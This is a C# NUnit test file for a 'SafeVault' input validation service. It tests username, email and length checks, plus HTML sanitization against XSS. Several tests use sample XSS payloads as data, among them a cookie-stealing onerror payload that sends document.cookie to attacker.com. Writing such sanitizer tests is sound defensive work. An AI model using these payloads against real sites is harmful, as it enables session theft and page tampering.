using NUnit.Framework;
using SafeVault.Services;

namespace SafeVault.Tests
{
    [TestFixture]
    public class TestInputValidation
    {
        private InputValidationService _validationService;

        [SetUp]
        public void Setup()
        {
            _validationService = new InputValidationService();
        }

        // ==================== USERNAME VALIDATION TESTS ====================

        [Test]
        public void TestValidUsername_ValidFormat()
        {
            // Arrange
            string validUsername = "john_doe123";

            // Act
            bool result = _validationService.ValidateUsername(validUsername);

            // Assert
            Assert.IsTrue(result, "Valid username should pass validation");
        }

        [Test]
        public void TestValidUsername_WithHyphen()
        {
            // Arrange
            string validUsername = "john-doe-123";

            // Act
            bool result = _validationService.ValidateUsername(validUsername);

            // Assert
            Assert.IsTrue(result, "Username with hyphens should be valid");
        }

        [Test]
        public void TestInvalidUsername_TooShort()
        {
            // Arrange
            string invalidUsername = "ab";

            // Act
            bool result = _validationService.ValidateUsername(invalidUsername);

            // Assert
            Assert.IsFalse(result, "Username with less than 3 characters should be invalid");
        }

        [Test]
        public void TestInvalidUsername_TooLong()
        {
            // Arrange
            string invalidUsername = new string('a', 51);

            // Act
            bool result = _validationService.ValidateUsername(invalidUsername);

            // Assert
            Assert.IsFalse(result, "Username exceeding 50 characters should be invalid");
        }

        [Test]
        public void TestInvalidUsername_SpecialCharacters()
        {
            // Arrange
            string invalidUsername = "john@doe!";

            // Act
            bool result = _validationService.ValidateUsername(invalidUsername);

            // Assert
            Assert.IsFalse(result, "Username with special characters should be invalid");
        }

        [Test]
        public void TestInvalidUsername_WithSpace()
        {
            // Arrange
            string invalidUsername = "john doe";

            // Act
            bool result = _validationService.ValidateUsername(invalidUsername);

            // Assert
            Assert.IsFalse(result, "Username with spaces should be invalid");
        }

        [Test]
        public void TestInvalidUsername_EmptyString()
        {
            // Arrange
            string invalidUsername = "";

            // Act
            bool result = _validationService.ValidateUsername(invalidUsername);

            // Assert
            Assert.IsFalse(result, "Empty username should be invalid");
        }

        // ==================== EMAIL VALIDATION TESTS ====================

        [Test]
        public void TestValidEmail_StandardFormat()
        {
            // Arrange
            string validEmail = "user@example.com";

            // Act
            bool result = _validationService.ValidateEmail(validEmail);

            // Assert
            Assert.IsTrue(result, "Standard email format should be valid");
        }

        [Test]
        public void TestValidEmail_WithSubdomain()
        {
            // Arrange
            string validEmail = "user@mail.example.co.uk";

            // Act
            bool result = _validationService.ValidateEmail(validEmail);

            // Assert
            Assert.IsTrue(result, "Email with subdomain should be valid");
        }

        [Test]
        public void TestInvalidEmail_NoAtSymbol()
        {
            // Arrange
            string invalidEmail = "userexample.com";

            // Act
            bool result = _validationService.ValidateEmail(invalidEmail);

            // Assert
            Assert.IsFalse(result, "Email without @ symbol should be invalid");
        }

        [Test]
        public void TestInvalidEmail_NoDomain()
        {
            // Arrange
            string invalidEmail = "user@";

            // Act
            bool result = _validationService.ValidateEmail(invalidEmail);

            // Assert
            Assert.IsFalse(result, "Email without domain should be invalid");
        }

        [Test]
        public void TestInvalidEmail_NoTLD()
        {
            // Arrange
            string invalidEmail = "user@example";

            // Act
            bool result = _validationService.ValidateEmail(invalidEmail);

            // Assert
            Assert.IsFalse(result, "Email without top-level domain should be invalid");
        }

        [Test]
        public void TestInvalidEmail_EmptyString()
        {
            // Arrange
            string invalidEmail = "";

            // Act
            bool result = _validationService.ValidateEmail(invalidEmail);

            // Assert
            Assert.IsFalse(result, "Empty email should be invalid");
        }

        // ==================== INPUT SANITIZATION TESTS ====================

        [Test]
        public void TestSanitizeInput_RemovesScriptTag()
        {
            // Arrange
            string maliciousInput = "Hello <script>alert('XSS')</script> World";

            // Act
            string result = _validationService.SanitizeInput(maliciousInput);

            // Assert
            Assert.That(result, Does.Not.Contain("<script>"), "Script tags should be removed");
            Assert.That(result, Does.Not.Contain("</script>"), "Script closing tags should be removed");
        }

        [Test]
        public void TestSanitizeInput_RemovesJavaScriptProtocol()
        {
            // Arrange
            string maliciousInput = "<a href=\"javascript:alert('XSS')\">Click me</a>";

            // Act
            string result = _validationService.SanitizeInput(maliciousInput);

            // Assert
            Assert.That(result, Does.Not.Contain("javascript:"), "JavaScript protocol should be removed");
        }

        [Test]
        public void TestSanitizeInput_RemovesEventHandlers()
        {
            // Arrange
            string maliciousInput = "<img src=x onerror=\"alert('XSS')\">";

            // Act
            string result = _validationService.SanitizeInput(maliciousInput);

            // Assert
            Assert.That(result, Does.Not.Contain("onerror"), "Event handlers should be removed");
        }

        [Test]
        public void TestSanitizeInput_RemovesIframe()
        {
            // Arrange
            string maliciousInput = "Content <iframe src=\"malicious.com\"></iframe> More content";

            // Act
            string result = _validationService.SanitizeInput(maliciousInput);

            // Assert
            Assert.That(result, Does.Not.Contain("<iframe"), "IFrame tags should be removed");
        }

        [Test]
        public void TestSanitizeInput_KeepsNormalContent()
        {
            // Arrange
            string normalInput = "Hello World 123!";

            // Act
            string result = _validationService.SanitizeInput(normalInput);

            // Assert
            Assert.That(result.Contains("Hello"), "Normal content should be preserved");
            Assert.That(result.Contains("World"), "Normal content should be preserved");
        }

        [Test]
        public void TestSanitizeInput_HandlesNullInput()
        {
            // Arrange
            string nullInput = null;

            // Act
            string result = _validationService.SanitizeInput(nullInput);

            // Assert
            Assert.IsNull(result, "Null input should return null");
        }

        // ==================== LENGTH VALIDATION TESTS ====================

        [Test]
        public void TestValidateLength_WithinLimit()
        {
            // Arrange
            string input = "Hello World";

            // Act
            bool result = _validationService.ValidateLength(input, 20);

            // Assert
            Assert.IsTrue(result, "Input within length limit should be valid");
        }

        [Test]
        public void TestValidateLength_ExceedsLimit()
        {
            // Arrange
            string input = new string('a', 256);

            // Act
            bool result = _validationService.ValidateLength(input, 255);

            // Assert
            Assert.IsFalse(result, "Input exceeding length limit should be invalid");
        }

        [Test]
        public void TestValidateLength_ExactLimit()
        {
            // Arrange
            string input = new string('a', 255);

            // Act
            bool result = _validationService.ValidateLength(input, 255);

            // Assert
            Assert.IsTrue(result, "Input matching exact limit should be valid");
        }

        // ==================== COMPREHENSIVE VALIDATION TESTS ====================

        [Test]
        public void TestValidateUserInput_BothValid()
        {
            // Arrange
            string username = "john_doe";
            string email = "john@example.com";

            // Act
            bool result = _validationService.ValidateUserInput(username, email);

            // Assert
            Assert.IsTrue(result, "Valid username and email should pass");
        }

        [Test]
        public void TestValidateUserInput_InvalidUsername()
        {
            // Arrange
            string username = "jd";
            string email = "john@example.com";

            // Act
            bool result = _validationService.ValidateUserInput(username, email);

            // Assert
            Assert.IsFalse(result, "Invalid username should fail validation");
        }

        [Test]
        public void TestValidateUserInput_InvalidEmail()
        {
            // Arrange
            string username = "john_doe";
            string email = "invalid-email";

            // Act
            bool result = _validationService.ValidateUserInput(username, email);

            // Assert
            Assert.IsFalse(result, "Invalid email should fail validation");
        }

        // ==================== XSS ATTACK SIMULATION TESTS ====================

        [Test]
        public void TestXSSAttack_AlertScript()
        {
            // Arrange - Simulate XSS attack attempt
            string xssAttempt = "<script>alert('XSS Attack')</script>";

            // Act
            bool isValid = _validationService.ValidateUsername("test_user");
            string sanitized = _validationService.SanitizeInput(xssAttempt);

            // Assert
            Assert.IsFalse(sanitized.Contains("<script>"), "Script injection should be prevented");
            Assert.IsFalse(sanitized.Contains("alert"), "Alert function should be removed");
        }

        [Test]
        public void TestXSSAttack_CookieStealing()
        {
            // Arrange - Simulate cookie stealing XSS
            string xssAttempt = "<img src=x onerror=\"fetch('http://attacker.com?cookie=' + document.cookie)\">";

            // Act
            string sanitized = _validationService.SanitizeInput(xssAttempt);

            // Assert
            Assert.That(sanitized, Does.Not.Contain("onerror"), "onerror handler should be removed");
            Assert.That(sanitized, Does.Not.Contain("fetch"), "Fetch code should be removed");
        }

        [Test]
        public void TestXSSAttack_DOMManipulation()
        {
            // Arrange - Simulate DOM manipulation attack
            string xssAttempt = "<img src=x onerror=\"document.body.innerHTML='<h1>Hacked</h1>'\">";

            // Act
            string sanitized = _validationService.SanitizeInput(xssAttempt);

            // Assert
            Assert.That(sanitized, Does.Not.Contain("onerror"), "Event handlers should be stripped");
        }

        [Test]
        public void TestXSSAttack_SvgOnload()
        {
            // Arrange - SVG with onload handler
            string xssAttempt = "<svg onload=\"alert('XSS')\">";

            // Act
            string sanitized = _validationService.SanitizeInput(xssAttempt);

            // Assert
            Assert.That(sanitized, Does.Not.Contain("onload"), "SVG onload handler should be removed");
        }

        [Test]
        public void TestXSSAttack_JavaScriptProtocol()
        {
            // Arrange - JavaScript protocol in link
            string xssAttempt = "<a href=\"javascript:void(0)\" onclick=\"alert('XSS')\">Click</a>";

            // Act
            string sanitized = _validationService.SanitizeInput(xssAttempt);

            // Assert
            Assert.That(sanitized, Does.Not.Contain("javascript:"), "Javascript protocol should be removed");
        }

        [Test]
        public void TestXSSAttack_IframeInjection()
        {
            // Arrange - Iframe injection attempt
            string xssAttempt = "Hello <iframe src=\"http://malicious.com\"></iframe> there";

            // Act
            string sanitized = _validationService.SanitizeInput(xssAttempt);

            // Assert
            Assert.That(sanitized, Does.Not.Contain("<iframe"), "IFrame injection should be prevented");
        }

        [Test]
        public void TestXSSAttack_HtmlEncode()
        {
            // Arrange
            string userInput = "<script>alert('XSS')</script>";

            // Act
            string encoded = _validationService.HtmlEncode(userInput);

            // Assert
            Assert.That(encoded, Does.Not.Contain("<script>"), "HTML should be encoded");
            Assert.That(encoded, Does.Contain("&lt;"), "Angle brackets should be encoded");
        }
    }
}
